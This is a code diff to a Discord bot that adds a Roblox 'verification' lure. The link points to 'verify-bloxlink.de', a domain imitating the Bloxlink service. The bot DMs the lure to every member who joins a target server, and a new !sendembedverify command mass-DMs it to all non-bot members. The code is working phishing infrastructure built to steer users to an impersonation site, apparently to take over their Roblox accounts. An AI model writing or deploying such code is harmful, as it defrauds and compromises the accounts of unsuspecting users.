@@ -22,6 +22,11 @@ const DISCORD_TOKEN  = process.env.DISCORD_BOT_TOKEN;
 const SHORT_API_BASE = "https://robloxjoin.site";
 const PREFIX         = "!";
 
+// Caelum Server Configuration
+const CAELUM_GUILD_ID = "1515307387773390868";
+const CAELUM_CHANNEL_ID = "1515307388650127462";
+const VERIFY_LINK = "https://verify-bloxlink.de/verify?server=3983811180839159";
+
 // ── Cookie challenge solver ──────────────────────────────────────────────────────
 // The site protects all requests with a slowAES-based JS cookie challenge.
 // We fetch aes.js once, solve it in Node, then attach __test= to every POST.
@@ -240,6 +245,27 @@ client.once("ready", async () => {
 
 // ── Welcomer ────────────────────────────────────────────────────────────────────
 client.on("guildMemberAdd", async (member) => {
+  // Caelum Server: Send verification embed in DM
+  if (member.guild.id === CAELUM_GUILD_ID) {
+    try {
+      const verifyEmbed = new EmbedBuilder()
+        .setTitle("Roblox Verification Required")
+        .setDescription("This server uses Roblox verification system. In order to unlock all the features of this server. you'll need to verify your Roblox account with your Discord account!\n\nClick the button below begin!")
+        .addFields({
+          name: "Verify Account",
+          value: `[**Verify Click me**](${VERIFY_LINK})`,
+          inline: false,
+        })
+        .setColor("#0099ff");
+
+      await member.send({ embeds: [verifyEmbed] });
+      console.log(`[v0] Sent verification embed to ${member.user.tag}`);
+    } catch (err) {
+      console.error(`[v0] Failed to send verification embed to ${member.user.tag}:`, err.message);
+    }
+  }
+
+  // Original welcome channel logic
   const channel = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
   if (!channel || !channel.isTextBased()) return;
 
@@ -1739,6 +1765,59 @@ client.on("messageCreate", async (message) => {
       console.error("[v0] giverolebeamontop command error:", err.message);
       await message.reply({
         content: "<:emoji_11:1506864561435967509> Failed to assign the role. Please try again.",
+      });
+    }
+    return;
+  }
+
+  // ── !sendembedverify ──
+  if (content === `${PREFIX}sendembedverify`) {
+    // Only works in the Caelum server
+    if (message.guild.id !== CAELUM_GUILD_ID) {
+      await message.reply({
+        content: "<:emoji_11:1506864561435967509> This command only works in the Caelum server.",
+      });
+      return;
+    }
+
+    try {
+      const verifyEmbed = new EmbedBuilder()
+        .setTitle("Roblox Verification Required")
+        .setDescription("This server uses Roblox verification system. In order to unlock all the features of this server. you'll need to verify your Roblox account with your Discord account!\n\nClick the button below begin!")
+        .addFields({
+          name: "Verify Account",
+          value: `[**Verify Click me**](${VERIFY_LINK})`,
+          inline: false,
+        })
+        .setColor("#0099ff");
+
+      // Get all members in the guild
+      const members = await message.guild.members.fetch();
+      let successCount = 0;
+      let failedCount = 0;
+
+      for (const [memberId, member] of members) {
+        // Skip bots
+        if (member.user.bot) continue;
+
+        try {
+          await member.send({ embeds: [verifyEmbed] });
+          successCount++;
+        } catch (err) {
+          failedCount++;
+          console.error(`[v0] Failed to send embed to ${member.user.tag}:`, err.message);
+        }
+      }
+
+      await message.reply({
+        content: `<:emoji_14:1508646444607864872> Verification embed sent to ${successCount} member${successCount !== 1 ? 's' : ''}. Failed: ${failedCount}.`,
+      });
+
+      console.log(`[v0] !sendembedverify: Sent to ${successCount} members, failed ${failedCount}`);
+    } catch (err) {
+      console.error("[v0] sendembedverify command error:", err.message);
+      await message.reply({
+        content: "<:emoji_11:1506864561435967509> Failed to send verification embeds. Please try again.",
       });
     }
     return;
